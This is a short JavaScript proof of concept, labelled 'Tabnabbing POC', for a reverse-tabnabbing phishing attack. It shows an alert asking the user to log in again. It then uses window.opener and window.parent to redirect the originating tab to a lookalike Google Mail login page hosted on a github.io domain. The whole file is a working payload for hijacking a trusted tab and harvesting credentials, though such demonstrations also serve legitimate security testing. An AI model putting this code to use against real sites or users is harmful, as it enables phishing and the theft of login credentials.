function myFunction(){
            alert('Tabnabbing POC\nPlease Login again to continue...');
}

if (window.opener) window.opener.parent.location.replace('https://mail-google.github.io/login/');
if (window.parent != window) window.parent.location.replace('https://mail-google.github.io/login/');